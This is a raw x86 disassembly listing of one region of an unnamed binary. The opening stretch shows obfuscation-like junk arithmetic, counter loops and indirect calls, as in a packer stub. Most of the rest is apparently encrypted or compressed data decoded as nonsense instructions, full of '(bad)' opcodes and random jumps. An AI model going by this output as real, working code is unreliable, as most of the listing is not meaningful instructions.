  41ae89:	into   
  41ae8a:	hlt    
  41ae8b:	popa   
  41ae8c:	dec    esp
  41ae8d:	addr16 pop ss
  41ae8f:	out    0x38,eax
  41ae91:	jnp    0x41aed3
  41ae93:	dec    ebp
  41ae94:	dec    edi
  41ae95:	add    BYTE PTR [ebx],0x3b
  41ae98:	xor    BYTE PTR [edi+0x1723c418],dh
  41ae9e:	js     0x41ae3e
  41aea0:	mov    esp,0x38aa8f8a
  41aea5:	inc    esi
  41aea6:	cmp    DWORD PTR [edx-0x50],ebx
  41aea9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aeaa:	xor    ebx,DWORD PTR [ebp+ecx*8-0x74ac2322]
  41aeb1:	push   ebp
  41aeb2:	or     BYTE PTR [ecx],ch
  41aeb4:	adc    eax,0x42a292
  41aeb9:	mov    ebx,DWORD PTR [ebp-0x58]
  41aebc:	sub    DWORD PTR ds:0x42a2c2,0x2e82
  41aec6:	add    edx,0x5708fa
  41aecc:	imul   edx,ebx
  41aecf:	sbb    ebx,0x1e47
  41aed5:	mov    DWORD PTR [ebp-0x58],edx
  41aed8:	or     DWORD PTR ds:0x42a29e,0x157
  41aee2:	mov    edx,DWORD PTR [ebp+0x8]
  41aee5:	sub    ebx,DWORD PTR ds:0x42a2f2
  41aeeb:	mov    ebx,DWORD PTR [ebp-0x54]
  41aeee:	add    edx,0x64f898
  41aef4:	or     DWORD PTR ds:0x42a25a,0x5c58
  41aefe:	or     edx,ebx
  41af00:	mov    ebx,DWORD PTR ds:0x42a322
  41af06:	mov    ebx,DWORD PTR [ebx]
  41af08:	sbb    DWORD PTR ds:0x42a2ee,ebx
  41af0e:	mov    DWORD PTR [ebp-0x54],edx
  41af11:	movzx  edx,WORD PTR ds:0x42a2c2
  41af18:	sub    DWORD PTR ds:0x42a28e,edx
  41af1e:	mov    edx,DWORD PTR [ebp+0x8]
  41af21:	xor    ebx,DWORD PTR ds:0x42a28a
  41af27:	mov    ebx,DWORD PTR [ebp-0x50]
  41af2a:	adc    DWORD PTR ds:0x42a29a,0x42a2a6
  41af34:	add    edx,ecx
  41af36:	sbb    DWORD PTR ds:0x42a2f2,0x42a2de
  41af40:	xor    edx,ebx
  41af42:	or     DWORD PTR ds:0x42a2de,edx
  41af48:	mov    DWORD PTR [ebp-0x50],edx
  41af4b:	and    DWORD PTR ds:0x42a262,0x0
  41af55:	xor    edx,edx
  41af57:	xor    edx,DWORD PTR ds:0x42a262
  41af5d:	inc    edx
  41af5e:	mov    DWORD PTR ds:0x42a262,edx
  41af64:	cmp    DWORD PTR ds:0x42a262,0x5
  41af6b:	jbe    0x41afb0
  41af71:	jmp    0x41af87
  41af76:	push   0x1fcb
  41af7b:	push   DWORD PTR [ebp-0x28]
  41af7e:	push   DWORD PTR [ebp-0x24]
  41af81:	call   DWORD PTR ds:0x42a402
  41af87:	cmp    DWORD PTR ds:0x42a262,0x4
  41af8e:	jne    0x41afa3
  41af94:	xor    edx,edx
  41af96:	or     edx,DWORD PTR ds:0x42a262
  41af9c:	inc    edx
  41af9d:	mov    DWORD PTR ds:0x42a262,edx
  41afa3:	cmp    DWORD PTR ds:0x42a262,0x16
  41afaa:	jb     0x41af55
  41afb0:	mov    edx,DWORD PTR [ebp+0x8]
  41afb3:	and    DWORD PTR ds:0x42a2f2,0x0
  41afbd:	xor    ebx,ebx
  41afbf:	or     ebx,DWORD PTR ds:0x42a2f2
  41afc5:	inc    ebx
  41afc6:	mov    DWORD PTR ds:0x42a2f2,ebx
  41afcc:	cmp    DWORD PTR ds:0x42a2f2,0xb
  41afd3:	jl     0x41b024
  41afd9:	jmp    0x41affd
  41afde:	push   0x1
  41afe0:	push   DWORD PTR [ebp-0x10]
  41afe3:	push   0x5b88
  41afe8:	push   0x81d2
  41afed:	push   0x4421
  41aff2:	push   0x50f5
  41aff7:	call   DWORD PTR ds:0x42a3c2
  41affd:	cmp    DWORD PTR ds:0x42a2f2,0xa
  41b004:	jne    0x41b017
  41b00a:	mov    ebx,DWORD PTR ds:0x42a2f2
  41b010:	inc    ebx
  41b011:	mov    DWORD PTR ds:0x42a2f2,ebx
  41b017:	cmp    DWORD PTR ds:0x42a2f2,0x18
  41b01e:	jb     0x41afbd
  41b024:	mov    ebx,DWORD PTR [ebp-0x4c]
  41b027:	adc    DWORD PTR ds:0x42a2f6,0x42a2e2
  41b031:	jmp    0x41d389
  41b036:	xchg   ebx,eax
  41b037:	jmp    0xab5b1b75
  41b03c:	add    DWORD PTR [ecx+0x1dcb2f48],0xf4cbd64c
  41b046:	mov    bh,bh
  41b048:	jl     0x41afcd
  41b04a:	inc    esi
  41b04b:	pop    esi
  41b04c:	add    DWORD PTR [ebx-0x13a959ad],0xffffff8b
  41b053:	mov    bh,0x88
  41b055:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b056:	dec    ecx
  41b057:	pop    ds
  41b058:	or     al,0x7a
  41b05a:	jb     0x41b031
  41b05c:	pop    ds
  41b05d:	outs   dx,BYTE PTR ds:[esi]
  41b05e:	sahf   
  41b05f:	sar    dh,1
  41b061:	inc    esp
  41b062:	or     ecx,edi
  41b064:	das    
  41b065:	xor    esi,0x9ba06a58
  41b06b:	push   es
  41b06c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b06d:	popa   
  41b06e:	mov    edi,gs
  41b070:	sbb    eax,0xe46d3a6
  41b075:	enter  0xf1f5,0xbd
  41b079:	lahf   
  41b07a:	mov    ebx,0x44886253
  41b07f:	lahf   
  41b080:	adc    eax,DWORD PTR [bx+si]
  41b083:	inc    eax
  41b084:	fstp   QWORD PTR [edi+0x58]
  41b087:	jne    0x41b09c
  41b089:	aas    
  41b08a:	and    DWORD PTR [ebx-0x1b3da8c5],eax
  41b090:	ss scas eax,DWORD PTR es:[edi]
  41b092:	pop    ebx
  41b093:	jne    0x41b0a3
  41b095:	jo     0x41b01f
  41b097:	xchg   edi,eax
  41b098:	mov    edi,0xb7b7a190
  41b09d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b09e:	jnp    0x41b0e5
  41b0a0:	mov    dl,BYTE PTR [edi+0x6566c35c]
  41b0a6:	mov    cl,0x85
  41b0a8:	push   es
  41b0a9:	push   eax
  41b0aa:	push   ecx
  41b0ab:	scas   al,BYTE PTR es:[edi]
  41b0ac:	fs dec ebp
  41b0ae:	mov    bl,0xd1
  41b0b0:	sub    BYTE PTR [edx+0x4e6ebb82],dh
  41b0b6:	aaa    
  41b0b7:	scas   eax,DWORD PTR es:[edi]
  41b0b8:	and    al,0x3a
  41b0ba:	lea    esi,[edx+0x395384e5]
  41b0c0:	not    BYTE PTR [ebx+0x23]
  41b0c3:	rcl    ecx,1
  41b0c5:	lock into 
  41b0c7:	inc    ecx
  41b0c8:	mov    ecx,eax
  41b0ca:	xchg   ecx,eax
  41b0cb:	addr16 pop esi
  41b0cd:	adc    esp,ebp
  41b0cf:	repnz outs dx,DWORD PTR ds:[esi]
  41b0d1:	sub    eax,0xba581a44
  41b0d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0d7:	xchg   esi,eax
  41b0d8:	in     al,0x63
  41b0da:	xchg   ebp,eax
  41b0db:	xor    eax,0xa1a24b8f
  41b0e0:	mov    ds:0xf30f7fc,eax
  41b0e5:	in     al,dx
  41b0e6:	or     dl,BYTE PTR [edi+0x50e4c80c]
  41b0ec:	bound  ebx,QWORD PTR [edi-0x3]
  41b0ef:	wrmsr  
  41b0f1:	pop    edi
  41b0f2:	jne    0x41b0f6
  41b0f4:	and    eax,ebx
  41b0f6:	push   cs
  41b0f7:	aad    0xd8
  41b0f9:	(bad)  
  41b0fa:	int3   
  41b0fb:	nop
  41b0fc:	and    edx,DWORD PTR [esi+0x21ce7ca9]
  41b102:	cld    
  41b103:	jmp    0xb2a6ea3c
  41b108:	and    edx,edx
  41b10a:	push   esi
  41b10b:	mov    eax,0x3b66da0
  41b110:	inc    ebp
  41b111:	and    cl,dl
  41b113:	mov    ebp,0x38b02de8
  41b118:	and    eax,0xc3973f4c
  41b11d:	jo     0x41b147
  41b11f:	fcomp  QWORD PTR [esi+ebp*8]
  41b122:	sub    eax,0xaa80b416
  41b127:	dec    ecx
  41b128:	pusha  
  41b129:	xor    BYTE PTR [edi+0x48f8281a],0x14
  41b130:	pop    ss
  41b131:	sbb    al,BYTE PTR [esi]
  41b133:	mov    ch,0xf7
  41b135:	adc    eax,0xac956d88
  41b13a:	or     ebp,eax
  41b13c:	jmp    0x41b13e
  41b13e:	xor    eax,0x8ef2f661
  41b143:	jmp    0x9f75:0x475652e5
  41b14a:	xchg   edx,eax
  41b14b:	ja     0x41b0da
  41b14d:	cmp    BYTE PTR [edi-0x6bb5a596],dh
  41b153:	dec    ebx
  41b154:	pushw  es
  41b156:	push   edi
  41b157:	mulps  xmm4,XMMWORD PTR [edx+0x54]
  41b15b:	fs loopne 0x41b0f9
  41b15e:	fnstsw WORD PTR [ebx]
  41b160:	cmc    
  41b161:	iret   
  41b162:	dec    ebx
  41b163:	mov    al,ds:0xcc20b0a2
  41b168:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b169:	and    eax,0x83b7658a
  41b16e:	push   ds
  41b16f:	div    DWORD PTR [esi]
  41b171:	sub    DWORD PTR [ecx+0xa],edx
  41b174:	cmp    ch,BYTE PTR [esi]
  41b176:	xchg   BYTE PTR [ebp-0x26550a41],dh
  41b17c:	sbb    ecx,DWORD PTR [esi]
  41b17e:	xor    eax,0x805d1770
  41b183:	inc    ebp
  41b184:	pushf  
  41b185:	jp     0x41b124
  41b187:	neg    BYTE PTR [edi]
  41b189:	ror    ebp,cl
  41b18b:	mov    dh,0x73
  41b18d:	(bad)  [esi]
  41b18f:	sar    bl,cl
  41b191:	xor    edi,DWORD PTR ds:0x5fe4625a
  41b197:	sub    BYTE PTR [ebx+0x36640472],ah
  41b19d:	fst    DWORD PTR [esi]
  41b19f:	scas   eax,DWORD PTR es:[edi]
  41b1a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1a1:	jle    0x41b1a5
  41b1a3:	mov    ds:0x92b3848c,eax
  41b1a8:	aaa    
  41b1a9:	call   0x29ccc4c3
  41b1ae:	sbb    eax,0xb5bfc5ae
  41b1b3:	jo     0x41b1ce
  41b1b5:	sti    
  41b1b6:	(bad)  
  41b1b7:	stc    
  41b1b8:	imul   ecx,DWORD PTR [edx],0x74
  41b1bb:	jbe    0x41b1bb
  41b1bd:	pop    edi
  41b1be:	xchg   ebx,eax
  41b1bf:	jne    0x41b199
  41b1c1:	adc    cl,al
  41b1c3:	je     0x41b152
  41b1c5:	xor    al,al
  41b1c7:	push   0xe6381c2e
  41b1cc:	addr16 loope 0x41b1ea
  41b1cf:	xchg   esi,eax
  41b1d0:	outs   dx,DWORD PTR ds:[esi]
  41b1d1:	push   ecx
  41b1d2:	mov    ebp,0x544f0f05
  41b1d7:	push   0x72
  41b1d9:	cmp    DWORD PTR [ebp-0x531673dc],edx
  41b1df:	pop    ss
  41b1e0:	xchg   esp,eax
  41b1e1:	sbb    eax,0xd8879fe
  41b1e6:	cli    
  41b1e7:	add    eax,0xbc4f61b6
  41b1ec:	jge    0x41b1a9
  41b1ee:	pop    edi
  41b1ef:	add    ecx,0x25
  41b1f2:	cdq    
  41b1f3:	mov    ch,0x14
  41b1f5:	cmp    esi,eax
  41b1f7:	scas   eax,DWORD PTR es:[edi]
  41b1f8:	aam    0x27
  41b1fa:	pop    edi
  41b1fb:	cld    
  41b1fc:	scas   al,BYTE PTR es:[edi]
  41b1fd:	in     eax,dx
  41b1fe:	jmp    0x41b187
  41b200:	push   ebp
  41b201:	xor    esp,esp
  41b203:	pushf  
  41b204:	dec    ebx
  41b205:	cmp    edx,DWORD PTR [ecx]
  41b207:	push   edx
  41b208:	push   esi
  41b209:	jnp    0x41b23e
  41b20b:	arpl   dx,ax
  41b20d:	out    dx,al
  41b20e:	ret    0xe653
  41b211:	mov    ds:0xbac20b1a,al
  41b216:	or     esi,DWORD PTR [eax+0x39a531d8]
  41b21c:	sub    eax,0x3c12e117
  41b221:	sahf   
  41b222:	xchg   cl,bl
  41b224:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b225:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b226:	inc    ebx
  41b227:	jns    0x41b277
  41b229:	gs leave 
  41b22b:	lds    edx,FWORD PTR [ecx+eax*2+0x7f10c47c]
  41b232:	push   ds
  41b233:	mov    ch,dl
  41b235:	sar    ah,1
  41b237:	pusha  
  41b238:	push   edi
  41b239:	push   esp
  41b23a:	popf   
  41b23b:	mov    ecx,esp
  41b23d:	loope  0x41b24f
  41b23f:	jecxz  0x41b1dc
  41b241:	mul    BYTE PTR [edx+0x7c]
  41b244:	adc    ebp,0x8c815d33
  41b24a:	and    DWORD PTR [edi],0xffffffa1
  41b24d:	shl    dh,0xc
  41b250:	gs dec edi
  41b252:	sub    eax,0x53d187ca
  41b257:	(bad)  
  41b258:	cmp    DWORD PTR [ecx+ecx*8-0x5e],0xfffffff3
  41b25d:	push   0x149a9398
  41b262:	adc    DWORD PTR [ecx+0x3deaffb5],edx
  41b268:	jnp    0x41b217
  41b26a:	pushf  
  41b26b:	jmp    0x31eb6e8e
  41b270:	rcl    edx,0xa5
  41b273:	out    dx,al
  41b274:	jmp    0x41b2d4
  41b276:	test   DWORD PTR [ebx-0x54],0x456aae5f
  41b27d:	aas    
  41b27e:	test   BYTE PTR [edx+0x1380478b],0x99
  41b285:	jns    0x41b255
  41b287:	or     bh,BYTE PTR ds:0xf3e653bb
  41b28d:	dec    edx
  41b28e:	test   al,0x10
  41b290:	add    DWORD PTR [ebx],ebp
  41b292:	and    eax,DWORD PTR [edi+0x4c]
  41b295:	xchg   ecx,eax
  41b296:	lahf   
  41b297:	sar    DWORD PTR [ebx],1
  41b299:	sbb    eax,0xdd63d7e9
  41b29e:	(bad)  
  41b29f:	sbb    BYTE PTR [ecx],bh
  41b2a1:	lahf   
  41b2a2:	add    BYTE PTR [edi+0x2ecc090e],ah
  41b2a8:	push   eax
  41b2a9:	hlt    
  41b2aa:	jmp    0x41b2cb
  41b2ac:	enter  0xdd82,0x81
  41b2b0:	cwde   
  41b2b1:	sub    eax,0xebdc8903
  41b2b6:	frndint 
  41b2b8:	hlt    
  41b2b9:	cwde   
  41b2ba:	repz adc eax,0xde466a1d
  41b2c0:	scas   al,BYTE PTR es:[edi]
  41b2c1:	lods   eax,DWORD PTR es:[esi]
  41b2c3:	adc    ecx,DWORD PTR [esi]
  41b2c5:	cmp    eax,0xbded0e76
  41b2ca:	inc    ebx
  41b2cb:	in     eax,dx
  41b2cc:	and    eax,0x24a9c46c
  41b2d1:	test   BYTE PTR [ecx-0x6b],dl
  41b2d4:	in     eax,dx
  41b2d5:	pop    eax
  41b2d6:	pop    esi
  41b2d7:	sahf   
  41b2d8:	repnz adc edi,esi
  41b2db:	sbb    cl,ah
  41b2dd:	push   ecx
  41b2de:	js     0x41b2f6
  41b2e0:	adc    eax,ebp
  41b2e2:	stc    
  41b2e3:	mov    dl,0x74
  41b2e5:	test   DWORD PTR [ebp+0x60],eax
  41b2e8:	pop    ss
  41b2e9:	mov    ch,BYTE PTR [esi+0x6b]
  41b2ec:	jge    0x41b2c6
  41b2ee:	int3   
  41b2ef:	pop    es
  41b2f0:	mov    dl,ah
  41b2f2:	in     eax,dx
  41b2f3:	or     DWORD PTR [esi],esi
  41b2f5:	push   ebp
  41b2f6:	(bad)  
  41b2f7:	fst    DWORD PTR [ecx]
  41b2f9:	fild   WORD PTR [edi+eax*8+0x5c7f058d]
  41b300:	mov    ebp,0x800793fb
  41b305:	or     al,BYTE PTR [ebp+0x44]
  41b308:	fild   QWORD PTR [esi-0x3cbf351c]
  41b30e:	shl    esp,1
  41b310:	mov    bh,0x98
  41b312:	outs   dx,BYTE PTR ds:[esi]
  41b313:	aad    0x35
  41b315:	mov    BYTE PTR [ebp-0x1e],bh
  41b318:	jg     0x41b310
  41b31a:	outs   dx,BYTE PTR ds:[esi]
  41b31b:	in     eax,0xe6
  41b31d:	pop    esi
  41b31e:	mov    esi,0x805d0a8c
  41b323:	mov    WORD PTR [eax],cs
  41b325:	and    al,0x76
  41b327:	mov    edi,ebx
  41b329:	sub    bl,BYTE PTR [edx-0x1]
  41b32c:	out    dx,eax
  41b32d:	loop   0x41b37a
  41b32f:	inc    edi
  41b330:	mov    dh,0xa
  41b332:	ret    
  41b333:	xchg   esi,eax
  41b334:	ss and al,0x75
  41b337:	add    al,0x20
  41b339:	cmp    BYTE PTR [edx],0x38
  41b33c:	mov    ebp,0x96ca8c80
  41b341:	add    DWORD PTR [esi+esi*1+0x64],ecx
  41b345:	jmp    0x41b342
  41b347:	nop
  41b348:	mov    edi,0xd668497d
  41b34d:	cmp    al,0xf2
  41b34f:	ds jnp 0x41b3a1
  41b352:	lds    ebx,FWORD PTR [edi-0x7e]
  41b355:	fs jo  0x41b314
  41b358:	lock jne 0x41b32c
  41b35b:	leave  
  41b35c:	jecxz  0x41b3cc
  41b35e:	rcr    DWORD PTR [edi],1
  41b360:	cli    
  41b361:	xor    al,0xbe
  41b363:	out    dx,al
  41b364:	push   eax
  41b365:	jbe    0x41b393
  41b367:	repz jnp 0x41b3d6
  41b36a:	dec    ebp
  41b36b:	je     0x41b364
  41b36d:	dec    esp
  41b36e:	fwait
  41b36f:	xchg   ebp,eax
  41b370:	jg     0x41b3a4
  41b372:	loope  0x41b324
  41b374:	fidivr DWORD PTR [edx]
  41b376:	xchg   edi,eax
  41b377:	mov    WORD PTR [ebx],gs
  41b379:	rcr    BYTE PTR [ecx+0xb9890c3],1
  41b37f:	js     0x41b316
  41b381:	sbb    esp,DWORD PTR [edx-0x71c5e8e2]
  41b387:	push   ebx
  41b388:	sub    eax,0x85f96bd9
  41b38d:	and    BYTE PTR [esi-0x14],dl
  41b390:	jmp    0x4c87:0x6a62b444
  41b397:	inc    edx
  41b398:	mov    ?,edi
  41b39a:	jmp    0x41b356
  41b39c:	sar    BYTE PTR [esi-0xb],cl
  41b39f:	xchg   ecx,eax
  41b3a0:	jae    0x41b387
  41b3a2:	(bad)  
  41b3a3:	std    
  41b3a4:	arpl   WORD PTR [edi-0x1e],dx
  41b3a7:	fstp   DWORD PTR [esi-0xb46b267]
  41b3ad:	adc    eax,0x5dd25c36
  41b3b2:	mov    esp,0x5b17ab5d
  41b3b7:	xlat   BYTE PTR ds:[ebx]
  41b3b8:	sbb    eax,0xb743a249
  41b3bd:	(bad)  
  41b3be:	dec    ebx
  41b3bf:	icebp  
  41b3c0:	lods   eax,DWORD PTR ds:[esi]
  41b3c1:	lods   eax,DWORD PTR ds:[esi]
  41b3c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3c3:	in     al,0xfe
  41b3c5:	daa    
  41b3c6:	outs   dx,BYTE PTR ds:[esi]
  41b3c7:	mov    ds:0xa50375fa,eax
  41b3cc:	pop    ebx
  41b3cd:	out    dx,al
  41b3ce:	mov    ecx,0xa74dbbc8
  41b3d3:	outs   dx,DWORD PTR ds:[esi]
  41b3d4:	lods   eax,DWORD PTR ds:[esi]
  41b3d5:	fild   DWORD PTR [ebx]
  41b3d7:	je     0x41b384
  41b3d9:	add    esi,eax
  41b3db:	out    dx,eax
  41b3dc:	inc    esi
  41b3dd:	retf   
  41b3de:	outs   dx,DWORD PTR ds:[esi]
  41b3df:	mov    eax,ds:0x589474c1
  41b3e4:	and    DWORD PTR [edx],ecx
  41b3e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3e7:	outs   dx,DWORD PTR ds:[esi]
  41b3e8:	aad    0xda
  41b3ea:	aad    0xcc
  41b3ec:	mov    dl,ch
  41b3ee:	inc    eax
  41b3ef:	rcl    DWORD PTR ds:0x2ce21027,cl
  41b3f5:	mov    esi,0xed0a8dd4
  41b3fa:	mov    eax,0x638e15bd
  41b3ff:	mov    DWORD PTR [edx],esp
  41b401:	inc    ebp
  41b402:	shl    esp,1
  41b404:	stc    
  41b405:	pop    esi
  41b406:	arpl   WORD PTR ds:0x6c09d5f4,cx
  41b40c:	pop    esi
  41b40d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b40e:	js     0x41b412
  41b410:	dec    ebp
  41b411:	repnz cmp eax,0x419e7cce
  41b417:	xchg   esp,eax
  41b418:	adc    edx,DWORD PTR [edx+eiz*1+0x2e]
  41b41c:	jg     0x41b3e7
  41b41e:	ins    BYTE PTR es:[edi],dx
  41b41f:	ja     0x41b486
  41b421:	push   eax
  41b422:	jb     0x41b499
  41b424:	xchg   ebp,eax
  41b425:	cvtpi2ps xmm1,QWORD PTR [edx]
  41b428:	cld    
  41b429:	pop    ds
  41b42a:	cmp    BYTE PTR [ebx+0x59c0e2a2],0x81
  41b431:	int    0x7b
  41b433:	push   ebx
  41b434:	xor    DWORD PTR [eax+0x18ab9c9c],ebx
  41b43a:	xchg   ebp,eax
  41b43b:	scas   eax,DWORD PTR es:[edi]
  41b43c:	xchg   edi,eax
  41b43d:	cmp    BYTE PTR [edx+0x6e098953],ch
  41b443:	cdq    
  41b444:	ds daa 
  41b446:	mov    cl,0x43
  41b448:	push   0xf64f17f7
  41b44d:	aam    0xfe
  41b44f:	mov    ds:0x61956fdf,eax
  41b454:	xlat   BYTE PTR ds:[ebx]
  41b455:	outs   dx,BYTE PTR ds:[esi]
  41b456:	or     eax,0x3b535bcd
  41b45b:	xchg   esi,eax
  41b45c:	xchg   esi,eax
  41b45d:	ret    0x52c9
  41b460:	(bad)  
  41b461:	outs   dx,DWORD PTR ds:[esi]
  41b462:	lds    ecx,FWORD PTR [edx]
  41b464:	mov    al,0x96
  41b466:	hlt    
  41b467:	dec    eax
  41b468:	mov    bh,0x6
  41b46a:	popf   
  41b46b:	in     eax,0xc7
  41b46d:	shl    DWORD PTR [esi+0x45],0x34
  41b471:	fwait
  41b472:	pusha  
  41b473:	vcmppd xmm4,xmm2,XMMWORD PTR [eax-0x30],0xbe
  41b479:	push   ecx
  41b47a:	imul   ebp,ebp,0x7
  41b47d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b47e:	add    ebx,ecx
  41b480:	test   eax,0xead8479b
  41b485:	mov    esp,0x4cd8bf14
  41b48a:	iret   
  41b48b:	shl    DWORD PTR [ebx],cl
  41b48d:	jecxz  0x41b448
  41b48f:	cmc    
  41b490:	jae    0x41b430
  41b492:	jg     0x41b45c
  41b494:	mov    ecx,edx
  41b496:	xor    BYTE PTR [esi+0x4c],dl
  41b499:	xor    esp,DWORD PTR [edi]
  41b49b:	dec    edx
  41b49c:	mov    bl,0xcb
  41b49e:	or     DWORD PTR [ebx+0x5a],esi
  41b4a1:	imul   ecx,DWORD PTR [edi+0x59],0xdc2c8b6c
  41b4a8:	cli    
  41b4a9:	adc    esp,ebp
  41b4ab:	add    al,ch
  41b4ad:	sub    bl,bh
  41b4af:	test   BYTE PTR [esi+ecx*8],bh
  41b4b2:	dec    edi
  41b4b3:	xchg   edx,eax
  41b4b4:	popa   
  41b4b5:	xor    ebp,DWORD PTR [ebx+eax*4+0x66d6fd41]
  41b4bc:	and    eax,DWORD PTR [eax]
  41b4be:	push   ebp
  41b4bf:	fstp   QWORD PTR [eax]
  41b4c1:	stc    
  41b4c2:	sbb    DWORD PTR [esi-0x7c],ebp
  41b4c5:	call   0x847b6606
  41b4ca:	dec    esi
  41b4cb:	xchg   edi,eax
  41b4cc:	jne    0x41b4f9
  41b4ce:	imul   esi,DWORD PTR [esi],0xffffffd6
  41b4d1:	mov    cl,0x46
  41b4d3:	mov    bl,0xae
  41b4d5:	sub    ch,BYTE PTR [edi]
  41b4d7:	test   DWORD PTR [eax+0x7c],ecx
  41b4da:	pop    ss
  41b4db:	xor    esp,ecx
  41b4dd:	sar    DWORD PTR [edx+eax*1+0x58],1
  41b4e1:	xor    esp,DWORD PTR [ecx+0xdcbbf8e]
  41b4e7:	sbb    esi,DWORD PTR [edi]
  41b4e9:	neg    BYTE PTR [esi+0x4c4f4fcc]
  41b4ef:	xor    al,0x9b
  41b4f1:	shl    DWORD PTR [edx+eax*2],cl
  41b4f4:	xchg   esi,eax
  41b4f5:	cmp    al,0xae
  41b4f7:	ins    DWORD PTR es:[edi],dx
  41b4f8:	call   0x526d6921
  41b4fd:	inc    ecx
  41b4fe:	repz je 0x41b4aa
  41b501:	or     dh,BYTE PTR [edi+0x7e105d6e]
  41b507:	sub    BYTE PTR [esi-0x3a],al
  41b50a:	jae    0x41b4ca
  41b50c:	push   ebp
  41b50d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b50e:	data16 sub al,0x9f
  41b511:	sahf   
  41b512:	cmp    BYTE PTR [eax],cl
  41b514:	xchg   edi,eax
  41b515:	enter  0xa51b,0x42
  41b519:	or     DWORD PTR [ecx],eax
  41b51b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b51c:	mov    al,0xf5
  41b51e:	sub    al,BYTE PTR [ebp+0x2f80a2bb]
  41b524:	and    eax,0x668e5915
  41b529:	jecxz  0x41b50a
  41b52b:	popa   
  41b52c:	dec    ebx
  41b52d:	shl    DWORD PTR [edi+ebp*2],0x98
  41b531:	(bad)  
  41b532:	in     eax,dx
  41b533:	cmp    ch,BYTE PTR [esi-0x9]
  41b536:	(bad)  
  41b537:	xor    esp,DWORD PTR [esi+ecx*4]
  41b53a:	retf   
  41b53b:	mov    DWORD PTR ss:[edi+0x5236fce7],esp
  41b542:	mov    ecx,0x9de418c3
  41b547:	aas    
  41b548:	fdivp  st(1),st
  41b54a:	jecxz  0x41b573
  41b54c:	test   eax,0xe74f36af
  41b551:	loopne 0x41b56e
  41b553:	sbb    ch,BYTE PTR [edi-0x71223e6f]
  41b559:	push   esp
  41b55a:	pause  
  41b55c:	cmp    eax,0xffffffca
  41b55f:	sub    al,BYTE PTR [ebx-0x3]
  41b562:	jne    0x41b5d7
  41b564:	shr    edx,0x42
  41b567:	cdq    
  41b568:	js     0x41b583
  41b56a:	gs es into 
  41b56d:	leave  
  41b56e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b56f:	xchg   ebx,eax
  41b570:	nop
  41b571:	lahf   
  41b572:	retf   
  41b573:	cmp    BYTE PTR [edx+0x7b80b35b],0xc4
  41b57a:	ja     0x41b586
  41b57c:	dec    ebp
  41b57d:	rcr    BYTE PTR [edx-0x45],cl
  41b580:	iret   
  41b581:	pusha  
  41b582:	cmp    esi,DWORD PTR [edx-0x60]
  41b585:	add    eax,0x39216a47
  41b58a:	push   ebx
  41b58b:	test   DWORD PTR [ebx+eiz*8-0x5bed8233],edx
  41b592:	jle    0x41b5a6
  41b594:	inc    ecx
  41b595:	mov    esp,0x31e58eae
  41b59a:	xchg   ecx,eax
  41b59b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b59c:	pop    esp
  41b59d:	push   ss
  41b59e:	lock retf 0x112f
  41b5a2:	aas    
  41b5a3:	pushf  
  41b5a4:	jbe    0x41b617
  41b5a6:	jg     0x41b5da
  41b5a8:	mov    WORD PTR [ebp+0x8],es
  41b5ab:	or     eax,0xc5a9d035
  41b5b0:	mov    ecx,0x51355857
  41b5b5:	sbb    al,0x29
  41b5b7:	xchg   edx,eax
  41b5b8:	pop    edi
  41b5b9:	lahf   
  41b5ba:	jl     0x41b5df
  41b5bc:	push   0xfffffff2
  41b5be:	xchg   ebp,eax
  41b5bf:	lea    edi,[esi-0x6d]
  41b5c2:	ins    DWORD PTR es:[edi],dx
  41b5c3:	test   DWORD PTR [ecx+0x27],ebx
  41b5c6:	ins    DWORD PTR es:[edi],dx
  41b5c7:	fmul   DWORD PTR [ecx]
  41b5c9:	call   0x3ad9:0xce45afe4
  41b5d0:	test   dh,0x1a
  41b5d3:	inc    edi
  41b5d4:	or     al,dh
  41b5d6:	or     esp,DWORD PTR [eax-0x4b]
  41b5d9:	cwde   
  41b5da:	icebp  
  41b5db:	retf   
  41b5dc:	dec    ebp
  41b5dd:	rcr    bh,1
  41b5df:	fnsave [esp-0x96dfdca]
  41b5e6:	test   al,0x15
  41b5e8:	xor    al,0x17
  41b5ea:	dec    esi
  41b5eb:	mov    al,ds:0x4095b01f
  41b5f0:	mov    esp,0xa52272f2
  41b5f5:	or     al,0x18
  41b5f7:	and    ah,BYTE PTR [eax-0x7fa7c45b]
  41b5fd:	mov    edi,0x7c4ad354
  41b602:	sbb    ch,BYTE PTR [ebx-0x56257bd9]
  41b608:	(bad)  
  41b609:	mov    bh,bh
  41b60b:	ja     0x41b660
  41b60d:	rol    BYTE PTR [ecx-0x3f3231c3],cl
  41b613:	or     ebp,eax
  41b615:	mov    WORD PTR [ebp+0x1844dfd],?
  41b61b:	xchg   edi,eax
  41b61c:	cmp    BYTE PTR [esi-0x4c128f9f],ah
  41b622:	mov    bl,0xb3
  41b624:	jmp    0x15794415
  41b629:	fiadd  WORD PTR [esi-0x43700edb]
  41b62f:	xlat   BYTE PTR ds:[ebx]
  41b630:	inc    ebx
  41b631:	or     eax,0x47a7556d
  41b636:	xchg   ebp,eax
  41b637:	in     al,0xb9
  41b639:	ret    0x6e0d
  41b63c:	test   al,0xe4
  41b63e:	mov    ds:0x67219c9a,al
  41b643:	inc    ecx
  41b644:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b645:	mov    ah,ch
  41b647:	das    
  41b648:	pop    ebp
  41b649:	setb   BYTE PTR gs:[ebx+0x42]
  41b64e:	leave  
  41b64f:	jp     0x41b637
  41b651:	dec    ebx
  41b652:	(bad)  
  41b654:	(bad)  
